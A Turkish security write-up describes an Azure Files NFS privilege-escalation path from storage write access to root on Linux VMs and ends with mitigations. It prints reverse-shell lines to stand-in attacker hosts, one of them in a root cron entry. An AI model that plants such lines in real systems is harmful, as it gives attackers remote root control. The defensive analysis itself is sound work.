## 1. Genel Bakış

*   **Saldırı Adı:** Azure-AZNFS-mount-Utility-Root-Privilege-Escalation
*   **Kategori:** Privilege Escalation (Yetki Yükseltme), Misconfiguration Abuse (Yanlış Yapılandırma İstismarı)
*   **Hedef Cloud Platformları:** Microsoft Azure
*   **Etki Alanı:** Azure Files (NFS Protocol), Azure Virtual Machines (Linux), Azure Storage Accounts

## 2. Teknik Özet

Bu saldırı tekniği, Azure Files servisinin NFS (Network File System) protokolü üzerinden sunulan yeteneklerinin, istemci taraflı (Linux VM) güvenlik mekanizmalarını atlatmak amacıyla kullanılmasını kapsar. Saldırgan, Azure Storage Account üzerinde sahip olduğu (veya ele geçirdiği) yazma yetkilerini kullanarak, NFS üzerinden mount edilmiş bir dosya sistemine kritik sistem dosyalarını (örnekat `cron`, `authorized_keys`, `sudoers`) enjekte eder. Eğer bir hedef VM, bu paylaşılan dizini root veya yüksek yetkili bir kullanıcı bağlamında (context) kullanıyorsa, saldırgan doğrudan işletim sistemi seviyesinde **Root** yetkisi kazanır.

**Temel Risk:** Cloud katmanındaki bir yetkinin (Storage Access), Compute katmanındaki en yüksek yetkiye (OS Root) dönüşmesi.

## Kontrol Listesi 
| Metrik | Seviye | Açıklama |
| :--- | :--- | :--- |
| **Zorluk** | Düşük/Orta | Sadece yazma yetkisi ve network erişimi yeterlidir. |
| **Gürültü Seviyesi** | Düşük (Stealthy) | NFS dosya değişiklikleri standart dosya operasyonu gibi görünür. |
| **Etki** | Kritik | VM üzerinde tam kontrol (Full System Compromise). |

## 3. Güvenlik Modeli ve Arka Plan

Azure Files NFS, geleneksel SMB'den farklı olarak kimlik doğrulamasını genellikle ağ seviyesindeki IP kısıtlamalarına veya istemci tarafından iletilen UID/GID (User ID/Group ID) bilgilerine dayandırır.

*   **Identity Gap:** NFS v3/v4.1 protokollerinde, istemci makine "ben root kullanıcısıyım" dediğinde, storage servisi bunu (eğer ek bir entegrasyon yoksa) varsayılan olarak kabul edebilir.
*   **Misconfiguration:** Azure Storage Account anahtarlarına (Access Keys) sahip olan bir saldırgan, NFS mount noktasındaki dosya içeriğini değiştirebilir. Eğer bu mount noktası bir Linux VM'de `/etc/` veya bir script dizini gibi kritik bir yere bağlanmışsa, identity boundary (kimlik sınırı) ihlal edilmiş olur.

## 4. Teknik Detaylar ve Çalışma Prensibi

Saldırı, cloud-native bir yetkinin, host-native bir yetkiye dönüştürülmesi (cross-layer escalation) mantığına dayanır.

### Mekanizma:
1.  **Access Acquisition:** Saldırgan, `Storage Blob Data Contributor` veya `Storage Account Key` yetkisiyle dosya sistemine erişir.
2.  **Payload Injection:** Saldırca, NFS mount edilen dizin içerisine bir "malicious trigger" yerleştirir.
    *   *Örnek:* Eğer mount noktası bir cron dizini ise, `/etc/cron.d/exploit` dosyası oluşturulur.
    *   *Örnek:* Eğer bir script dizini ise, mevcut bir scriptin sonuna `bash -i >& /dev/tcp/attacker_ip/4444 0>&1` komutu eklenir.
3.  **Execution:** Hedef VM, rutin bir işlem sırasında (cron job, sistem boot, script execution) bu değiştirilmiş dosyayı çalıştırır.
4.  **Privilege Escalation:** Komut, VM üzerindeki `root` kullanıcısı yetkisiyle çalıştığı için saldırgan reverse shell elde eder.

## 5. Gerekli Yetkiler 

Saldırganın aşağıdaki yetki veya konfigürasyon hatalarına sahip olması gerekir:

*   **Minimum IAM Yetkisi:** `Storage Account Key` erişimi veya `Storage Blob Data Contributor` rolü.
*   **Network Access:** Azure Storage Account üzeründaki "Firewalls and virtual networks" ayarlarının, saldırganın bulunduğu IP veya VNet'e izin vermesi.
*   **Misconfiguration (Kritik):**
    *   Azure Files NFS share'in bir Linux VM'e `root_squash` kapalı veya yetersiz konfigüre edilmiş şekilde mount edilmiş olması.
    *   Mount noktasının, VM üzerinde kritik sistem dosyalarını barındıran veya çalıştıran bir dizin olması.

## mu 6. Detaylı Saldırı Senaryosu 

**Senaryo: "The Cron-Shadow Escalation"**

1.  **Initial Access:** Saldırgan, bir geliştiricinin yanlışlıkla GitHub'a sızdırdığı Azure Storage Access Key'i ele geçirir.
2.  **Discovery:** Saldırgan, `az storage file list` komutuyla paylaşımları listeler ve bir NFS mount noktasını (örn: `//mystorage.file.core.windows.net/nfs_share`) keşfeder.
3.  **Lateral Movement (Cloud to Host):** Saldırgan, bu share'in bir iç networkteki Ubuntu VM tarafından `/opt/scripts/` dizinine mount edildiğini fark eder.
4.  **Exploitation (Payload):** Saldırgan, share içerisine bir cron dosyası oluşturur:
    ```bash
    # Oluşturulan dosya: /nfs_share/malicious_cron
    * * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
    ```
5.  **Execution:** Ubuntu VM'deki sistem cron servisi, her dakika bu yeni dosyayı okur ve `root` yetkisiyle komutu çalıştırır.
6.  **Persistence & Full Compromise:** Saldırgan reverse shell üzerinden VM'de root yetkisiyle kalıcı hale gelir.

## 7. Etkilenen Ortamlar

*   **Azure Files (NFS):** Tüm NFS v3/v4.1 kullanan paylaşımlar.
*   **Linux Virtual Machines:** Azure üzerinde çalışan, NFS mount kullanan tüm Linux dağıtımları.
*   **Kubernetes (AKS):** Persistent Volume (PV) olarak Azure Files NFS kullanan podlar (Pod escape/container breakout riski).
*   **Multi-Cloud:** Eğer bu NFS share bir AWS EC2 veya GCP Compute Engine üzerinden mount ediliyorsa, saldırı kapsamı genişler.

## 8. Saldırı Karakteristikleri

*   **Detection Difficulty:** **Yüksek.** Dosya sistemi operasyonları (yazma/silme) genellikle "normal" iş yükü olarak görünür.
*   **Noise Level:** **Çok Düşük.** Standart bir dosya güncellemesi gibi görünür; ağ trafiğinde anomalik bir durum yaratmaz.
*   **Persistence:** **Yüksek.** Dosya sisteminde kalıcı bir değişiklik yapıldığı için sistem yeniden başlatılsa bile saldırı devam eder.

## mu 9. Önleme ve Mitigasyon Stratejileri

| Katman | Önlem | Açıklama |
| :--- | :--- | :--- |
| **Identity (IAM)** | **Principle of Least Privilege** | Storage Account erişimini sadece gerekli servislerin kullanmasını sağlayın. Key rotation uygulayın. |
| **Network** | **Private Endpoints** | Storage Account'a erişimi sadece Private Link üzerinden, belirli VNet'lere kısıtlayın. |
| **Configuration** | **Mount Options** | NFS mount işlemlerinde `nosuid`, `noexec` gibi güvenlik flag'lerini kullanın. |
| **Monitoring** | **Azure Storage Logging** | Storage Analytics Logs üzerinden `PutBlob` veya `Write` operasyonlarını izleyin. |
| **Configuration** | **Immutable Storage** | Kritik yapılandırma dosyalarının olduğu alanlarda "Immutable" (değiştirilemez) politikalar uygulayın. |

---

*© 2025 AltHack Security — Gerçek Dünya Siber Güvenlik İstihbaratı*
